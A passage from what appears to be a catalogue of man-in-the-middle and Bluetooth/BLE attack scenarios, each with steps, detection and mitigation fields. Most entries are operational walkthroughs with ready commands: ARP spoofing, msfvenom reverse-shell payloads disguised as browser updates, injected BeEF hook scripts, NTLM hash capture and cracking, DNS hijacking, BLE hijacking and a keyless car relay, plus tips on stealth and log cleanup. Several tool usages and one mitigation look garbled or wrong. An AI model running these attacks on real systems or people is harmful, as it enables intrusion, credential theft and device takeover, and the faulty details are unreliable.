Attack Steps: Step 1: Set up a packet capture environment using Wireshark or tcpdump. Step 2: If on LAN/Wi-Fi, perform ARP spoofing using Bettercap or ettercap to redirect victim traffic through your machine. Step 3: Monitor protocols known to send plaintext credentials: http, ftp, telnet, smtp, imap. In Wireshark use filter tcp contains "USER" or ftp. Step 4: Wait for user to log into an app/site that uses plaintext auth. Step 5: Extract visible credentials from captured payloads or headers (look for Authorization: Basic, login=, passwd=, etc). Step 6: For encrypted sites, combine with SSL Stripping (see NET-078) to force HTTP downgrade and intercept credentials. Step 7: Optionally use phishing page (e.g., with Wifiphisher or Captive Portal) to trick user into entering credentials. Step 8: Store and analyze harvested credentials for reuse or password spraying. Step 9: Works best on legacy services or users trained to trust unencrypted login pages. Step 10: Document attack path and stop ARP spoofing and sniffing tools after use.
Detection Method: Monitor for plaintext login over public protocols; alert on HTTP POSTs to unknown IPs
Solution: Enforce use of secure authentication (HTTPS, SFTP, SSH); train users to avoid logging into untrusted networks

Title: Exploit Delivery
Scenario Description: Injects malware (e.g., trojan EXEs, malicious scripts) through MITM to redirect user traffic to a malicious file or exploit-laden webpage.
Attack Steps: Step 1: Gain network position using ARP spoofing or Evil Twin setup. Step 2: Start MITMf (Man-in-the-Middle Framework) with the --inject module enabled and configure it to redirect target requests to your malicious site or file server: mitmf --spoof --arp --gateway 192.168.1.1 --target 192.168.1.10 --inject --js-url http://yourserver/payload.js. Step 3: Prepare a custom payload using Metasploit: msfvenom -p windows/meterpreter/reverse_tcp LHOST=yourip LPORT=4444 -f exe > update.exe. Step 4: Host this file on a fake "update" site or redirect target’s HTTP requests to http://yourip/update.exe. Step 5: Start listener on Metasploit or Netcat to catch incoming reverse shell. Step 6: When user accesses a benign page, it is silently redirected or injected to your site. If they accept the download, endpoint is compromised. Step 7: Upon execution, Meterpreter shell opens, giving full remote control. Step 8: Monitor via sessions in Metasploit. Step 9: Clean traces post-execution for stealth. Note: This only works if victim has weak browser security, no AV, and accepts download. Use in test lab only.
Vulnerability: No traffic validation, weak endpoint hygiene
Detection Method: Monitor DNS/HTTP logs for redirect patterns; flag traffic to unknown IPs or file downloads over HTTP
Solution: Enforce HTTPS-only sites; use endpoint protection (AV, EDR); browser security settings

Title: JavaScript Injection
Scenario Description: Inject JavaScript payloads into HTML pages visited by the victim to track behavior, steal data, or take control via browser exploitation.
Attack Steps: Step 1: Perform ARP spoofing to place yourself between target and router. Step 2: Use mitmproxy with script to inject JS into every HTML response. Script example: def response(flow): if flow.response.headers.get("content-type", "").startswith("text/html"): flow.response.content = flow.response.content.replace(b"</body>", b"<script src='http://yourserver/hook.js'></script></body>"). Step 3: Save script as inject.py and run mitmproxy: mitmproxy -s inject.py. Step 4: Create or host hook.js from BeEF framework, which connects back to BeEF control panel: beef-xss. Step 5: When victim visits any HTTP website, your injected JS runs in their browser and connects to your BeEF server. Step 6: Inside BeEF panel, see hooked browser and run commands like alert(), get cookies, inject keylogger, or port scan internal network. Step 7: Use real-time control or exploit vulnerable plugins (e.g., Flash). Step 8: Stop injection and spoofing after demo. Step 9: Only works on unencrypted sites. Use HSTS or HTTPS to prevent.
Impact: User tracking, data theft, client-side control
Detection Method: Monitor JS injection via proxy logs; use Content Security Policy (CSP) headers
Solution: Enforce HTTPS; implement CSP and SRI headers; disable scripts from untrusted origins

Title: Fake Update Injection
Scenario Description: Forces or tricks user into downloading a fake update (e.g., Flash, browser, Zoom) through MITM redirection or JS injection, resulting in system compromise.
Attack Steps: Step 1: Set up MITM position using Evil Twin + Captive Portal (e.g., Wifiphisher), or ARP spoofing. Step 2: In the phishing portal or through MITM JS injection, insert a popup or redirect that mimics a browser/OS update: e.g., “Your browser needs an update to continue – Click Here to Update”. Step 3: Prepare a fake update file using Metasploit: msfvenom -p windows/meterpreter/reverse_tcp LHOST=yourip LPORT=4444 -f exe > chrome_update.exe. Step 4: Host the EXE on your server and link it in the portal JS or HTML: Download Now. Step 5: When victim clicks and runs the file, reverse shell is opened to your Metasploit listener. Step 6: If using BeEF, you can simulate auto-download via JavaScript injection using window.location = .... Step 7: Once inside, elevate privileges or dump credentials. Step 8: Use persistence options in Meterpreter for long-term access. Step 9: Monitor for AV alerts, cleanup logs afterward. Step 10: This method relies on human trust in “update” messages – make them believable with logos and design.
Detection Method: DNS/HTTP log inspection; unusual file downloads over HTTP; alerts on known malware hash
Solution: Disable software auto-updates via browser; validate digitally signed installers only; user awareness training

Title: DNS-over-HTTPS Blocking (DoH Bypass)
Attack Type: DoH Blocking and Plaintext DNS Downgrade
Scenario Description: Forces clients using DNS-over-HTTPS (DoH) to fall back to insecure plaintext DNS, enabling DNS spoofing or redirection via MITM.
Attack Steps: Step 1: Place attacker machine on the same network segment as the victim (e.g., Wi-Fi hotspot, Evil Twin, or ARP spoof). Step 2: Identify and block known DoH endpoints used by browsers (e.g., dns.google, mozilla.cloudflare-dns.com). Use iptables to drop outgoing HTTPS traffic to port 443 for these DoH IPs: iptables -A OUTPUT -p tcp -d 8.8.8.8 --dport 443 -j DROP. Step 3: When DoH fails, browsers often fallback to plaintext DNS. Step 4: Run a local DNS proxy (like Bettercap’s net.recon + dns.spoof) to hijack DNS traffic: dns.spoof on and set dns.spoof.domains * and set dns.spoof.address 192.168.1.100 to redirect all domains. Step 5: Start a fake website or phishing server on your machine’s IP. Step 6: Any URL the user visits will resolve to your malicious server. Step 7: Monitor requests and log credentials. Step 8: Works on systems with weak DoH enforcement and no DNSSEC. Step 9: Combine with captive portals to make the attack more persistent. Step 10: Stop iptables rules after the attack: iptables -F.
Impact: Redirect all domain traffic to fake destinations
Detection Method: Monitor DNS requests failing over DoH; alert on excessive DNS fallback to port 53
Solution: Enforce strict DoH in browser or OS policy; block DNS-over-plain protocols; use secure DNS resolvers
Tags: DoH Blocking, DNS Hijack, Plaintext DNS

Title: NTLM/SMB Credential Capture
Attack Type: Windows Hash Capture via Forced Auth Trigger
Scenario Description: Exploits Windows’ automatic SMB authentication behavior by redirecting HTTP/UNC links to attacker's SMB server, capturing NTLMv2 hashes for offline cracking or relay.
Attack Steps: Step 1: Set up your attack machine on the same LAN/Wi-Fi. Step 2: Launch Responder: responder -I eth0 or responder -I wlan0 -wrf. This tool will listen for SMB, HTTP, FTP, and other service requests and respond with a fake SMB server. Step 3: Trigger Windows to auto-connect by redirecting victim traffic to an SMB share like \\192.168.1.100\share using emails, fake links, or MITM tools (e.g., ettercap HTML injection). Alternatively, use Bettercap to inject in HTML responses. Step 4: As soon as the victim’s browser or OS attempts to render or fetch that file, Windows sends NTLM hash automatically. Step 5: Responder captures it and shows NTLMv2 hash in terminal. Step 6: Save hash and use john or hashcat with wordlists or brute-force: john --format=netntlmv2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt. Step 7: If cracked, password is recovered. Step 8: You can also relay NTLM credentials in real-time using tools like ntlmrelayx.py (Impacket). Step 9: Shut down Responder after use. Step 10: Works on systems with NTLM fallback and no SMB signing.
Vulnerability: NTLM auth auto-response, no SMB signing
Detection Method: Monitor for outbound SMB traffic to unknown IPs; alert on internal NTLM hashes captured via sensors
Solution: Disable NTLM/SMB fallback; enforce SMB signing; disable LLMNR and NBT-NS; endpoint DNS hardening

Title: Redirect All HTTP Requests
Scenario Description: Uses MITM to transparently redirect all plaintext HTTP traffic to a malicious host or phishing page. Ideal for captive portal attacks and malware delivery setups.
Attack Steps: Step 1: Set up MITM position using ARP spoofing (Bettercap: net.probe on, set arp.spoof.targets 192.168.1.10, arp.spoof on). Step 2: Configure iptables to redirect all port 80 (HTTP) traffic to a local proxy: iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080. Step 3: Start mitmproxy to act as intercepting proxy: mitmproxy -p 8080. Step 4: Modify HTTP responses using a custom script or mitmproxy filter to redirect every request to your fake phishing page or malware delivery page: flow.response.headers["Location"] = "http://yourserver/login.html". Step 5: Victim visits any HTTP site and gets redirected to your malicious page. Step 6: Capture credentials entered or trigger file download. Step 7: Combine with Evil Twin Wi-Fi to expand reach. Step 8: Monitor logs in mitmproxy or browser dev tools. Step 9: Reset iptables after attack: iptables -F. Step 10: This works only on HTTP (unencrypted); HTTPS blocks the redirection. Best used in captive environments or with SSL strip combo.
Detection Method: Monitor for excessive redirects or unexpected HTTP 3xx responses to unknown IPs
Solution: Enforce HSTS/HTTPS; block unknown gateways or proxies; disable open Wi-Fi logins without certificate validation

Title: ARP Spoofing
Scenario Description: Attacker poisons the ARP cache of a victim and/or gateway, causing traffic to flow through the attacker’s machine (MITM).
Attack Steps: Step 1: Ensure you’re on the same LAN/Wi-Fi as the victim (connect to same network). Step 2: Find your own IP, gateway IP, and interface name: use ip a or ifconfig. Note them down (e.g., eth0 or wlan0, gateway: 192.168.1.1). Step 3: Enable IP forwarding so the victim still has internet while you relay traffic: run echo 1 > /proc/sys/net/ipv4/ip_forward. Step 4: Install and run Bettercap (preferred tool for ease). Run sudo bettercap -iface wlan0 (replace with your interface). Step 5: In the Bettercap terminal, enable network scanning: net.probe on. It will list devices. Step 6: Find your victim’s IP (e.g., 192.168.1.50) and set them as target: set arp.spoof.targets 192.168.1.50. Step 7: Activate ARP spoofing: arp.spoof on. Step 8: Now you are the MITM. You can inspect traffic with modules like net.sniff on or use Wireshark to view intercepted packets. Step 9: Optionally, inject code into HTTP pages: http.proxy on + http.proxy.injectjs http://yourserver/hook.js. Step 10: To stop attack, type arp.spoof off and net.recon off, then exit Bettercap. Step 11: Disable IP forwarding: echo 0 > /proc/sys/net/ipv4/ip_forward. NOTE: Only works on LAN and if victim uses unencrypted traffic (HTTP, unencrypted DNS, etc). HTTPS is mostly safe unless combined with SSLStrip.
Detection Method: Monitor ARP tables for sudden changes (e.g., multiple IPs with same MAC); alert on frequent ARP replies from single MAC
Solution: Use static ARP entries, ARPwatch, Dynamic ARP Inspection (DAI), enforce HTTPS, segment networks

Title: OBEX Push Exploit
Scenario Description: Exploits open OBEX Push Profile on vulnerable Bluetooth devices to retrieve phonebook, call logs, and calendar entries without authentication.
Attack Steps: Step 1: Ensure your system has a Bluetooth adapter. Install bluesnarfer: sudo apt install bluesnarfer bluez. Step 2: Set your Bluetooth adapter to scanning mode: hciconfig hci0 up, then hcitool scan to detect nearby Bluetooth devices. Step 3: Identify the target Bluetooth MAC address (e.g., 00:11:22:33:44:55). Step 4: Run bluesnarfer -r 1-100 -b 00:11:22:33:44:55 to try and read phonebook entries 1 to 100. You may also use -C 3 if the OBEX channel is not default. Step 5: If the device has OBEX Push Profile enabled and unauthenticated, you will receive phonebook or contact data in plain text. Step 6: You can also attempt to retrieve calendar entries with -f or messages with -m. Step 7: This attack only works on old or poorly configured devices that expose OBEX without user prompt. Modern phones typically block this. Step 8: Log all extracted data and stop scan. Step 9: Reset Bluetooth adapter: hciconfig hci0 down. Warning: Legal and ethical use only — this is a real privacy breach attack.
Detection Method: Monitor OBEX access attempts via Bluetooth logs (if supported); Bluetooth audit logs
Solution: Disable OBEX, set Bluetooth to "not discoverable", block legacy profiles

Title: Unauthenticated AT Command Injection
Attack Type: Direct AT Command Abuse via Bluetooth Serial
Scenario Description: Attacker connects over Bluetooth serial profile (RFCOMM) and sends AT modem commands to control the device — reading SMS, calls, network info, etc.
Tools Used: rfcomm, serial terminal, cu, screen, AT commands
Attack Steps: Step 1: Install Bluetooth tools: sudo apt install bluez rfcomm. Step 2: Scan for nearby Bluetooth devices: hcitool scan. Note MAC address. Step 3: Discover available services and RFCOMM channel: sdptool browse 00:11:22:33:44:55. Look for "Serial Port" profile and note channel (e.g., channel 2). Step 4: Bind the channel to a serial device: sudo rfcomm connect /dev/rfcomm0 00:11:22:33:44:55 2. Step 5: Use a serial terminal like screen /dev/rfcomm0 or cu -l /dev/rfcomm0 to connect. Step 6: Once connected, type AT commands directly. Example: AT+CMGL="ALL" (list SMS), AT+CNUM (get own number), ATD+123456789; (initiate call), etc. Step 7: If no authentication is required, the phone will respond with sensitive data. Step 8: Exit with +++\r and AT+CHUP to hang up if needed. Step 9: Disconnect: sudo rfcomm release /dev/rfcomm0. Step 10: This attack only works on devices exposing Bluetooth modem profiles without pairing.
Vulnerability: Open RFCOMM profile, no pairing enforced
Impact: Full control of device (SMS, call, number exposure)
Detection Method: Monitor for unauthorized RFCOMM connections; logs of AT command execution
Solution: Disable Serial Port Profile; require pairing for all services; patch legacy Bluetooth stacks
Tags: AT Commands, RFCOMM, Bluetooth Modem Abuse

Title: Bluetooth v1.1/v1.2 Vulnerability
Scenario Description: Exploits known vulnerabilities in legacy Bluetooth protocols (1.1, 1.2), including weak pairing, unauthenticated channels, and poor encryption.
Attack Steps: Step 1: Use a Bluetooth adapter that supports low-level sniffing, e.g., Ubertooth One. Install its tools: git clone https://github.com/greatscottgadgets/ubertooth, then build and install. Step 2: Scan for nearby devices: hcitool scan. Step 3: Use ubertooth-scan to sniff legacy Bluetooth pairing attempts and note down device class and pairing data. Step 4: Capture pairing key exchange: ubertooth-btle -f. On legacy v1.1/v1.2 devices, this often contains weak or no encryption. Step 5: Attempt brute-force or dictionary attack using captured link keys: btcrack -f capture.cap -d dict.txt. Step 6: If successful, reuse link key to impersonate device or connect as trusted. Step 7: Exploit weak pairing to initiate spoofing or inject traffic. Step 8: Legacy devices often respond to broadcast messages and don’t enforce authentication, allowing unauthorized read/write access. Step 9: Disconnect, clear logs, and power off Ubertooth.
Detection Method: Monitor for pairing attempts and MAC spoofing; legacy devices lack strong logging
Solution: Disable or retire legacy Bluetooth v1.1/1.2; enforce secure pairing and key exchange

Title: BT File Transfer Profile Abuse
Scenario Description: Attacker connects to open File Transfer (FTP) or Basic Printing Profile (BPP) and pulls stored files or pushes malicious files silently.
Attack Steps: Step 1: Ensure Bluetooth is enabled: sudo hciconfig hci0 up. Step 2: Scan for nearby devices: bluetoothctl → scan on. Note target MAC address. Step 3: Pair with the target device if allowed: pair AA:BB:CC:DD:EE:FF. Many older devices auto-accept or don’t require PINs. Step 4: Trust the device: trust AA:BB:CC:DD:EE:FF. Step 5: If FTP or OBEX Push is enabled and unprotected, attacker can browse directories or upload files. Use obexftp -b AA:BB:CC:DD:EE:FF -l to list files. Step 6: Download files with obexftp -b AA:BB:CC:DD:EE:FF -g filename.jpg. Step 7: Upload malicious file (e.g., auto-executing media or scripts): obexftp -b AA:BB:CC:DD:EE:FF -p payload.exe. Step 8: If device auto-executes or shares media files, victim is at risk. Step 9: Works only on poorly configured phones, printers, IoT devices. Step 10: Exit with quit in bluetoothctl, or reset adapter with hciconfig hci0 down.
Vulnerability: Exposed OBEX/FTP profile without access control
Impact: File theft, malware delivery, privacy leak
Detection Method: Monitor OBEX transfer attempts; alert on untrusted OBEX or FTP sessions
Solution: Disable File Transfer and Printing profiles unless needed; require pairing and PIN

Title: BlueSmack (DoS)
Attack Type: Denial of Service via L2CAP Ping
Scenario Description: Attacker uses legacy Bluetooth ping (L2CAP echo) with large payloads to crash or freeze target Bluetooth stack — "Bluetooth Ping of Death".
Attack Steps: Step 1: Install BlueZ tools: sudo apt install bluez. Step 2: Enable your Bluetooth interface: hciconfig hci0 up. Step 3: Scan for devices: hcitool scan to get MAC address of target. Step 4: Launch the attack with large packet size: l2ping -i hci0 -s 600 -f AA:BB:CC:DD:EE:FF. This sends a flood of 600-byte echo packets. Step 5: On legacy or poorly implemented stacks (Bluetooth v1.1/1.2 or unpatched Android), this may crash, freeze, or reboot the device. Step 6: If the device becomes unresponsive, the DoS succeeded. Step 7: Stop flooding by pressing Ctrl+C. Step 8: Reset interface: hciconfig hci0 down. Note: Modern Bluetooth stacks mitigate this, but old devices, embedded systems, and some POS terminals may still be affected. Use ethically and legally.
Vulnerability: L2CAP echo packet handling without limits
Detection Method: Monitor for excessive L2CAP echo requests in logs (rare); user complaint of device freeze during scan
Solution: Patch firmware; rate-limit L2CAP echo responses; disable Bluetooth on unpatched embedded systems

Title: MITM via BT Pairing Spoof
Scenario Description: Attacker pretends to be a trusted device during pairing, tricking user to connect through attacker’s proxy and intercepting data or commands.
Attack Steps: Step 1: Setup Bluetooth adapter and ensure it supports active MITM (use CSR-based dongle or external adapter with HCI support). Step 2: Enable scanning: hciconfig hci0 up and bluetoothctl → scan on. Step 3: Monitor for a device trying to pair with a known MAC address (e.g., car infotainment or headset). Step 4: Create a spoofed device with same name and class: spoofing-tool --mac 00:11:22:33:44:55 --name "JBL Speaker". You can also use Bettercap to spoof advertisements: ble.recon on + ble.spoof on. Step 5: Wait for the victim to initiate pairing. They may see your spoofed name and accept it unknowingly. Step 6: Accept connection and establish a MITM channel. Use relays to forward traffic to the real device or capture/control it. Step 7: Capture audio streams, call logs, or injected commands (e.g., redial, volume). Step 8: After session, drop the connection and clear adapter config: hciconfig hci0 reset. Step 9: Works best when victim device uses auto-pair or fast connect (cars, earbuds).
Detection Method: Monitor Bluetooth pairing logs; look for duplicate device names or suspicious MAC addresses
Solution: Enable Secure Simple Pairing (SSP); avoid public pairing; verify device identity (MAC + name) before accepting
Tags: Bluetooth MITM, Pairing Spoof, Audio Hijack

Title: BT Pairing Key Guessing
Scenario Description: Attackers brute-force commonly used or static pairing PINs (e.g., 0000, 1234) to derive link keys and decrypt traffic between paired devices.
Attack Steps: Step 1: Scan for Bluetooth devices using hcitool scan and note the MAC address. Step 2: Monitor and capture pairing packets using btmon or hcidump. Wait for a victim to pair a legacy device (Bluetooth v2.0 or lower) using PIN. Step 3: Save the captured pairing traffic. The legacy protocol often sends enough data to allow key derivation. Step 4: Use crackle to analyze the pairing packets: crackle -i btmon.log -o decrypted.pcap. Step 5: Crackle will try commonly used pairing keys such as 0000, 1234, 1111, etc. and output the decrypted session key. Step 6: If successful, attacker can use the key to decrypt all previously captured Bluetooth traffic. Step 7: This may expose credentials, SMS, audio, or keystrokes from HID devices. Step 8: Repeat with custom PIN lists if common PINs fail. Step 9: This attack is only possible on legacy pairing (not Secure Simple Pairing used by modern devices). Step 10: Disable adapter: hciconfig hci0 down to finish.
Detection Method: Monitor repeated failed pairing attempts; alert on legacy protocol use
Solution: Use Secure Simple Pairing (SSP); retire legacy BT devices; block fixed PIN-based pairings
Tags: Bluetooth Brute Force, PIN Guessing, Crackle

Title: Bluetooth LE (BLE) MITM
Scenario Description: BLE-based IoT or wearables can be intercepted by spoofing both ends of a BLE connection and relaying/modifying packets.
Attack Steps: Step 1: Ensure your system has a BLE sniffer tool (e.g., nRF52840 dongle with btlejack firmware). Install btlejack: pip install btlejack. Step 2: Plug in the dongle and verify with btlejack -s. Step 3: Start sniffing BLE advertisement packets: btlejack -d 0 -s. Identify target device and central (e.g., phone + smart lock). Step 4: Once devices begin pairing or communicating, use btlejack -j to jam the connection. This forces devices to re-establish communication via attacker’s channel. Step 5: Relay packets between both devices, modifying commands, leaking credentials, or capturing session data. Step 6: Tools like gattacker allow impersonating BLE peripherals or faking services to harvest data. Step 7: Analyze packets using Wireshark with BLE filters (e.g., btatt, btcommon). Step 8: Store sensitive payloads like heart rate data, unlock commands, or tokens. Step 9: Stop sniffing: Ctrl+C. Disconnect the sniffer and power down. Step 10: BLE MITM is silent and fast but only works if encryption is weak or keys are reused (e.g., no bonding).
Vulnerability: Weak or missing encryption/bonding on BLE link
Impact: Credential theft, health or access data exposure
Detection Method: Monitor for duplicate device IDs; observe BLE channel collisions; enable encrypted connections
Solution: Enforce BLE bonding with encryption; validate device addresses and require user consent for pairing
Tags: BLE MITM, IoT Exploits, btlejack, gattacker

Title: NFC-BT Relay
Scenario Description: Exploits devices with NFC auto-pairing for Bluetooth by relaying connection data between NFC-enabled phone and distant attacker-controlled device.
Tools Used: Proxmark3, Android NFC tools, relay apps
Attack Steps: Step 1: Use an NFC-capable relay tool like Proxmark3 or two Android phones with NFC enabled. Install NFCTools or custom relay app. Step 2: Place relay device near the target NFC phone. Ensure the attacker's second phone or Bluetooth dongle is ready to receive the forwarded pairing signal. Step 3: When the user taps their phone to pair with a legitimate NFC speaker or headset, the relay captures the NFC payload (which includes BT MAC, pairing intent). Step 4: Forward this payload over the internet or local Wi-Fi to the attacker’s second device. Step 5: The second device initiates Bluetooth pairing with the victim using the relayed credentials. Step 6: If the victim accepts or auto-accepts (common in NFC quick-pairing), a link is established between victim and attacker-controlled BT device. Step 7: Now attacker can send malicious audio commands, inject input, or act as HID. Step 8: Works on Android phones with auto-pair and older NFC tags. Step 9: Disable NFC or clear recent pairings to mitigate after attack. Step 10: Clean up traces by rebooting relay phones and disabling BT on both ends.
Detection Method: Monitor for unexpected pairings; alert on BT devices without UI prompt
Solution: Disable NFC auto-pairing; always prompt users before pairing; alert on out-of-band pairing methods
Tags: NFC Relay, Auto-Pair Hijack, Bluetooth Pairing

Title: Advertising Spoof
Scenario Description: Attacker spoofs the advertisement packets of a legitimate BLE device (e.g., fitness tracker, smart lock) to trick users or mobile apps into connecting to them.
Tools Used: btlejack, BtleJuice, bleah, nRF Connect, hcitool
Attack Steps: Step 1: Use a BLE scanner like nRF Connect or btlejack -s to scan for nearby BLE devices. Identify a target device (e.g., Mi Band, smart thermostat) and note its advertising payload (name, UUID, service UUIDs). Step 2: Use a tool like bleah or BtleJuice to create a spoofed advertiser that mimics the original device's name, MAC, and UUIDs. Example: bleah -b AA:BB:CC:DD:EE:FF -n "FitBand" to clone its name. Step 3: Start broadcasting spoofed advertisements. Victim devices or apps that auto-connect (based on expected name or UUID) may attempt to pair with this fake device. Step 4: Optionally, use btlejack -j to jam original device, ensuring victim sees only spoofed signal. Step 5: Attacker can now proceed to collect app connection attempts, GATT requests, or trick the user into pairing. Step 6: This can lead to data theft, misconfiguration, or session hijack depending on what the app/device exchanges. Step 7: Exit spoofing tool and disable BT when finished.
Detection Method: Scan for duplicate BLE advertisements; analyze RSSI consistency
Solution: Verify advertiser MAC or device ID in app; use signed BLE advertisements if supported
Tags: BLE Spoof, Advertising Clone, App Hijack

Title: Device Impersonation
Attack Type: Replay Advertising and Emulated Services (GATT Clone)
Scenario Description: Clone an entire BLE device’s public presence — advertisements and GATT profile — to fool apps or devices into treating the attacker as the real device.
Attack Steps: Step 1: Use nRF Connect or btlejack to sniff advertising packets and GATT structure of a target BLE device. Note all service UUIDs, characteristics, and handles. Step 2: Use gattacker or bleno to recreate the exact same BLE device. For gattacker, install with npm install -g gattacker. Step 3: Setup impersonation: gattacker -m AA:BB:CC:DD:EE:FF -n "FitTracker" and load the cloned GATT profile (JSON or from dump). Step 4: Start broadcasting as the cloned device. Any connected app or phone expecting this device may now send data, perform actions, or sync logs with attacker. Step 5: Read the GATT logs to extract credentials, tokens, or sync data. Step 6: Modify characteristic responses to send spoofed sensor data or control commands (e.g., fake step count, unlock signal). Step 7: This attack can trick medical apps, fitness apps, smart locks, and home automation hubs. Step 8: Shut down the attacker’s fake service after data exfiltration.
Vulnerability: No GATT profile or device identity validation
Impact: App spoofing, data injection, identity theft
Detection Method: Monitor duplicate MAC/device names; verify unexpected data in app logs
Solution: Bind devices with unique GATT fingerprinting or signed identity; alert on identical devices with different RSSI/distance
Tags: BLE Impersonation, GATT Replay, IoT Spoofing

Title: MITM in Pairing
Scenario Description: Intercept BLE pairing between central (phone) and peripheral (device) to inject or capture keys, session data, or modify traffic.
Attack Steps: Step 1: Setup your BLE sniffer tool (Ubertooth One or nRF dongle with btlejack). Start sniffing: btlejack -d 0. Step 2: Wait for the user to initiate pairing with a BLE device using legacy pairing (Just Works or PIN-based). Legacy pairing does not protect against MITM. Step 3: Use Bettercap or gattacker to spoof both the phone and the BLE device. Act as a proxy — forward messages between them. Example: emulate the BLE device using gattacker, and simultaneously connect to the real BLE device from another interface. Step 4: Relay all pairing data, including pairing request, confirmation, and key exchange. Intercept and store Long-Term Key (LTK) or Short Term Key (STK). Step 5: Once pairing completes, maintain connection and intercept or modify future encrypted communication. You can now log data (e.g., heart rate), send malicious commands, or impersonate the device permanently. Step 6: Store captured session keys for future replay or analysis. Step 7: Shut down connections after testing. This works best on BLE devices that use "Just Works" mode, which lacks MITM protection.
Vulnerability: No protection in legacy pairing (Just Works mode)
Detection Method: Detect untrusted pairing MACs; use BLE pairing logs; watch for repeated pairing attempts
Solution: Always use authenticated LE Secure Connections (LESC); block legacy pairing methods; use numeric comparison where possible
Tags: BLE Pairing MITM, Key Capture, LE Legacy Attack

Title: Fake Notifications
Scenario Description: Attacker mimics or clones a BLE device and sends fake sensor data or alerts (e.g., high heart rate, device battery low) to trick the user or system into false actions.
Tools Used: nRF Connect, bleno, gattacker, BLE Peripheral
Attack Steps: Step 1: Use nRF Connect or gattacker to scan the original BLE device and extract its GATT profile (especially services that support notifications). Step 2: Note the characteristic UUIDs that support "Notify" (usually marked with properties like 0x10). Step 3: Set up a fake BLE peripheral using bleno (Node.js): install with npm install bleno and run a script that advertises the same device name and GATT profile. Step 4: Configure the service to send fake values — e.g., a fake glucose level of 400 mg/dL, or battery at 1%. Step 5: Broadcast advertising packets with matching UUIDs so the app or phone connects to the attacker’s device. Step 6: Once connected, the spoofed device pushes fake notifications using notify() function of bleno. Step 7: Victim app believes this is the real device and may take actions such as alerting user, disabling a feature, or triggering cloud alerts. Step 8: Use a packet sniffer (btmon, Wireshark) to log the fake data. Step 9: Shut down the attack by stopping the advertising process. Step 10: Reset BT device or power cycle after test to avoid device cache issues.
Vulnerability: Trusting any BLE notifications without origin check
Impact: Trigger false alarms or spoofed health/IoT data
Detection Method: Monitor app logs for unusual data patterns; validate device MAC address and connection history
Solution: Bind apps to specific device identities; validate incoming data with signatures or device fingerprint
Tags: BLE Notifications, Data Spoof, GATT Notify

Title: GATT Spoofing
Scenario Description: Clone a legitimate BLE device's GATT structure and respond to app queries with false or malicious values, often used in spoofing or fuzzing.
Attack Steps: Step 1: Use nRF Connect or btlejack to explore and dump the GATT profile of a legitimate BLE device. Note the structure: services, characteristics, properties, handles, and values. Step 2: Create a spoofed BLE device using gattacker or bleno. These tools allow you to build a virtual BLE device in code. Step 3: Replicate the services (e.g., Heart Rate Service, Device Info) and characteristics exactly as they appear. For example, define UUID 180D for heart rate with characteristic 2A37. Step 4: Start the emulated BLE peripheral, advertising same name and service UUIDs. Step 5: When a victim app or device connects, it queries these characteristics — the spoofed device responds with fake but valid-looking data. Step 6: Optionally return values that trigger bugs in the app or cause bad decisions (e.g., unlock signal when not allowed). Step 7: Record interaction logs for analysis. Step 8: This technique is also used in fuzzing apps or validating app security. Step 9: Stop spoofed device via Ctrl+C. Step 10: Clean up Bluetooth cache on host device if persistent spoofing causes connection issues.
Vulnerability: No validation of GATT service authenticity
Impact: App misbehavior, spoofed interactions, data abuse
Detection Method: Monitor for duplicate UUID usage; scan for unauthorized device fingerprints
Solution: Apps should verify device identity via secure pairing; avoid connecting based on GATT data alone
Tags: BLE Emulation, Service Spoofing, IoT Abuse

Title: Connection Hijack
Attack Type: Takeover or Preemption of BLE Session Connection
Scenario Description: Attacker disrupts or preempts an ongoing BLE connection, forcing the legitimate device to disconnect and replacing it with a spoofed clone.
Attack Steps: Step 1: Identify a BLE session in progress using a sniffer like btlejack or Bettercap BLE. Observe the central-peripheral MAC addresses and connection interval. Step 2: Jam or disrupt the connection temporarily — using btlejack -j to cause interference or via Ubertooth/2.4GHz jammers. This causes the peripheral or central to disconnect. Step 3: Simultaneously, attacker starts a spoofed BLE peripheral (using gattacker, bleno, or Bettercap BLE) that advertises with the same name, MAC (if possible), and GATT structure. Step 4: If app/device attempts reconnection, it may connect to the spoofed attacker device, thinking it's the original. Step 5: Attacker now serves data, receives queries, or modifies ongoing commands. Step 6: In some BLE stacks (e.g., Android <9), caching and auto-connect features make this hijack more effective. Step 7: Log all data exchanged during this hijacked session. Step 8: Restore environment by turning off spoofed device and resetting target connections. Step 9: Clean Bluetooth cache on phone or BLE host. Step 10: This works best in environments with signal overlap or jam-prone frequency.
Vulnerability: No session binding or weak reconnection validation
Impact: Full control over BLE session after hijack
Detection Method: Monitor for mid-session disconnections; alert on MAC reuse; log session restoration patterns
Solution: Use BLE Secure Connections and bonding; implement white-listing or connection signatures at app level
Tags: BLE Session Hijack, Reconnect Spoofing, MITM

Title: Proximity Relay
Attack Type: Relay BLE packets to bypass distance checks
Scenario Description: Attacker extends the BLE signal of a keyfob or phone to spoof its proximity to a target device like a car or smart lock.
Attack Steps: Step 1: Set up two BLE-capable devices (e.g., Raspberry Pis or laptops with BLE dongles). One will act as the Gadget (near the target lock/car), the other as the Mole (near the victim with BLE keyfob/phone). Step 2: Install relayme or btproxy on both devices. These tools forward BLE packets between each other over Wi-Fi or Ethernet. Step 3: Position the Mole within BLE range of the victim's keyfob (e.g., outside home or pocket). Start scanning for advertisements from the keyfob. Step 4: Start the Gadget side near the target lock/car that uses BLE proximity detection. It relays BLE requests to the Mole, which forwards them to the actual keyfob. Step 5: The keyfob thinks it’s near the car and responds. Response is forwarded back through the chain to the car. Step 6: Car or lock verifies the key is "present" and unlocks or starts. Step 7: Attack completes without needing to touch or compromise the key. Works even when victim is indoors and car is outside. Step 8: Shut down the relay when done. Logs can be saved for debugging or replay. Step 9: Clean up Bluetooth adapters and reboot them to avoid caching issues.
Vulnerability: BLE-based proximity unlock trust signal strength
Detection Method: Monitor for unusual unlock patterns; check signal strength vs. time inconsistencies
Solution: Use UWB (Ultra-Wideband), motion sensors, or multi-factor unlock (e.g., touch + proximity) to block relay attempts
Tags: BLE Relay, Keyless Bypass, Proximity Unlock Hack
Source: DEF CON Talks, Car Hack Docs

Title: BLE Beacon Injection
Scenario Description: Attacker spoofs BLE beacon packets to inject misleading data (e.g., phishing URLs, fake store locations) that devices automatically react to.
Tools Used: hcitool, beacon_spammer.py, btmgmt, Raspberry Pi, BlueZ
